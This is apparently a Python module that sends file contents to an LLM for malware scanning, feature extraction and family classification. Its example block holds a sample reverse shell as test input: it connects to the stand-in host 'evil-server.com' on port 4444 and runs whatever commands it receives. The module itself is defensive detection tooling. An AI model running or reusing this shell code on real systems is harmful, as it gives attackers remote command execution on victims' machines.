"""
Malware Detection Module
Malware identification and analysis using LLM
Based on AVScan2Vec approaches from the research paper
"""

from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from enum import Enum

from src.utils.llm_client import LLMClient
from src.utils.logger import get_logger

logger = get_logger(__name__)


class MalwareType(Enum):
    """Types of malware"""
    VIRUS = "virus"
    WORM = "worm"
    TROJAN = "trojan"
    RANSOMWARE = "ransomware"
    SPYWARE = "spyware"
    ADWARE = "adware"
    ROOTKIT = "rootkit"
    BOTNET = "botnet"
    BACKDOOR = "backdoor"


@dataclass
class MalwareReport:
    """Malware detection report"""
    is_malware: bool
    confidence: float
    malware_types: List[MalwareType]
    behaviors: List[str]
    iocs: List[str]  # Indicators of Compromise
    severity: str
    recommendations: List[str]


@dataclass
class MalwareFamily:
    """Malware family classification"""
    family_name: str
    confidence: float
    characteristics: List[str]
    known_variants: List[str]


class MalwareDetectionModule:
    """Malware Detection Module using LLM"""

    def __init__(self):
        self.llm_client = LLMClient()
        logger.info("Malware Detection Module initialized")

    def scan_file(self, file_content: str, file_type: str = "unknown") -> MalwareReport:
        """Scan file for malware"""
        logger.info(f"Scanning {file_type} file for malware")

        prompt = f"""Analyze this file content for malware:

File Type: {file_type}

Content:
```
{file_content[:1000]}
```

Analyze for:
- Malicious patterns
- Suspicious behaviors
- Known malware signatures
- IOCs (IPs, domains, file hashes)
- Obfuscation techniques

Provide JSON:
{{
    "is_malware": boolean,
    "confidence": float (0-1),
    "malware_types": ["virus|worm|trojan|ransomware|spyware|adware|rootkit|botnet|backdoor"],
    "behaviors": ["malicious behaviors observed"],
    "iocs": ["indicators of compromise"],
    "severity": "CRITICAL|HIGH|MEDIUM|LOW",
    "recommendations": ["recommended actions"]
}}"""

        try:
            result = self.llm_client.complete_with_json(prompt, max_tokens=1500)

            malware_types = [
                MalwareType(mt.lower())
                for mt in result.get("malware_types", [])
                if mt.lower() in [e.value for e in MalwareType]
            ]

            report = MalwareReport(
                is_malware=result.get("is_malware", False),
                confidence=result.get("confidence", 0.0),
                malware_types=malware_types,
                behaviors=result.get("behaviors", []),
                iocs=result.get("iocs", []),
                severity=result.get("severity", "LOW"),
                recommendations=result.get("recommendations", [])
            )

            logger.info(
                f"Scan complete: {'MALWARE' if report.is_malware else 'CLEAN'} "
                f"(confidence: {report.confidence:.2f})"
            )
            return report

        except Exception as e:
            logger.error(f"Malware scan failed: {e}")
            raise

    def extract_features(self, binary_data: str) -> Dict[str, Any]:
        """Extract features from binary for malware analysis"""
        logger.info("Extracting malware features")

        prompt = f"""Extract malware analysis features from this binary:

```
{binary_data[:500]}
```

Extract:
- API calls
- Registry modifications
- Network connections
- File operations
- Encryption/encoding
- Anti-debugging techniques

Provide JSON with extracted features."""

        try:
            result = self.llm_client.complete_with_json(prompt)
            return result
        except Exception as e:
            logger.error(f"Feature extraction failed: {e}")
            return {}

    def classify_malware_family(self, features: Dict[str, Any]) -> MalwareFamily:
        """Classify malware into family"""
        logger.info("Classifying malware family")

        prompt = f"""Classify this malware based on features:

Features: {features}

Identify:
- Malware family name
- Key characteristics
- Known variants
- Attribution if possible

Provide JSON:
{{
    "family_name": "malware family",
    "confidence": float (0-1),
    "characteristics": ["key traits"],
    "known_variants": ["variant names"]
}}"""

        try:
            result = self.llm_client.complete_with_json(prompt)

            family = MalwareFamily(
                family_name=result.get("family_name", "Unknown"),
                confidence=result.get("confidence", 0.0),
                characteristics=result.get("characteristics", []),
                known_variants=result.get("known_variants", [])
            )

            logger.info(f"Classified as: {family.family_name}")
            return family

        except Exception as e:
            logger.error(f"Classification failed: {e}")
            raise


# Example usage
if __name__ == "__main__":
    detector = MalwareDetectionModule()

    suspicious_script = """
import os
import socket
import subprocess

# Connect to C2 server
s = socket.socket()
s.connect(("evil-server.com", 4444))

# Execute commands
while True:
    cmd = s.recv(1024).decode()
    if cmd == "exit":
        break
    output = subprocess.check_output(cmd, shell=True)
    s.send(output)
"""

    print("=" * 70)
    print("MALWARE DETECTION DEMONSTRATION")
    print("=" * 70)

    try:
        report = detector.scan_file(suspicious_script, "python_script")

        print(f"\nMalware Detected: {report.is_malware}")
        print(f"Confidence: {report.confidence:.0%}")
        print(f"Severity: {report.severity}")

        if report.malware_types:
            print(f"\nMalware Types:")
            for mt in report.malware_types:
                print(f"  - {mt.value}")

        if report.behaviors:
            print(f"\nMalicious Behaviors:")
            for behavior in report.behaviors[:3]:
                print(f"  - {behavior}")

        if report.iocs:
            print(f"\nIOCs Found:")
            for ioc in report.iocs[:3]:
                print(f"  - {ioc}")

    except Exception as e:
        print(f"Error: {e}")
